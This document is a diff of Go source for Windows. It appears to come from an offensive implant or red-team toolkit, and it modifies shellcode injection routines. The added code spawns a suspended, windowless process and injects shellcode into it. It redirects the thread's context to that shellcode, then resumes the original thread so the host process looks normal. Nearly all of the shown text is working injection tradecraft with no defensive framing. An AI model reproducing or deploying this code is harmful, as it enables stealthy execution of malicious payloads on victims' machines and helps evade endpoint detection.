@@ -7,7 +7,6 @@ import (
 	"debug/pe"
 	"errors"
 	"fmt"
-	"log"
 	"strconv"
 	"strings"
 	"syscall"
@@ -20,8 +19,16 @@ import (
 	"golang.org/x/sys/windows"
 )
 
-func SpawnInjectReadPipe(shellcode []byte, exeToSpawn string) (string, error) {
-	var err error
+func SpawnInjectReadPipe(shellcode []byte, args []string) (string, error) {
+	if len(args) < 2 {
+		return "", fmt.Errorf("Not Enough Args.")
+	}
+	exeToSpawn := args[0]
+	timeoutMinutes := args[1]
+	mins, err := strconv.Atoi(timeoutMinutes)
+	if err != nil {
+		return "", err
+	}
 	saAttr := windows.SecurityAttributes{}
 	saAttr.Length = uint32(unsafe.Sizeof(saAttr))
 	saAttr.InheritHandle = 1
@@ -92,10 +99,10 @@ func SpawnInjectReadPipe(shellcode []byte, exeToSpawn string) (string, error) {
 	var STILL_RUNNING uint32 = 259
 	var loops int
 	for {
-		if loops > (60 * 5) {
-			// wait 60 seconds max
-			log.Println("5 Minutes HIT!")
-			break
+		if mins != 0 {
+			if loops > mins {
+				break
+			}
 		}
 		_, err := winapi.GetExitCodeThread(syscall.Handle(hThread), &exitCode)
 		if err != nil && !strings.Contains(err.Error(), "operation completed successfully") {
@@ -121,7 +128,6 @@ func SpawnInjectReadPipe(shellcode []byte, exeToSpawn string) (string, error) {
 		results += string(buffer)
 	}
 	return results, nil
-
 }
 
 /*
@@ -183,17 +189,42 @@ func SpawnInject(shellcode []byte, exeToSpawn string) (string, error) {
 	if err != nil {
 		return "", err
 	}
-	flags := uint32(syscall.CREATE_UNICODE_ENVIRONMENT)
-	flags |= windows.CREATE_NO_WINDOW
+
 	si := new(windows.StartupInfo)
 	si.Cb = uint32(unsafe.Sizeof(*si))
+	si.Flags = windows.STARTF_USESHOWWINDOW
 	pi := new(windows.ProcessInformation)
-	err = windows.CreateProcess(arg0, arg0, nil, nil, false, flags, nil, nil, si, pi)
+	err = windows.CreateProcess(nil, arg0, nil, nil, false, windows.CREATE_NO_WINDOW|windows.CREATE_SUSPENDED, nil, nil, si, pi)
 	if err != nil {
 		return "", err
 	}
 	pidStr := strconv.Itoa(int(pi.ProcessId))
-	return RemoteInject(shellcode, pidStr)
+	hThread, threadStart, err := RemoteInjectReturnThread(shellcode, pidStr)
+	if err != nil {
+		return "", err
+	}
+	// get thread context
+	ctx := winapi.CONTEXT{}
+	ctx.ContextFlags = winapi.CONTEXT_INTEGER
+	err = winapi.GetThreadContext(uintptr(hThread), &ctx)
+	if err != nil {
+		return "", err
+	}
+	ctx.Rax = winapi.DWORD64(threadStart)
+	// setting main thread to be our injected code.
+	err = winapi.SetThreadContext(uintptr(hThread), &ctx)
+	if err != nil {
+		return "", err
+	}
+	windows.ResumeThread(windows.Handle(hThread))
+	go func() {
+		// wait for our code to finish then resume main thread so process continues normally.
+		windows.WaitForSingleObject(windows.Handle(hThread), windows.INFINITE)
+		windows.ResumeThread(pi.Thread)
+		windows.CloseHandle(pi.Thread)
+		windows.CloseHandle(pi.Process)
+	}()
+	return fmt.Sprintf("[+] Success Created PID %s", pidStr), nil
 }
 
 func RemoteInjectReturnThread(shellcode []byte, pid string) (syscall.Handle, uintptr, error) {
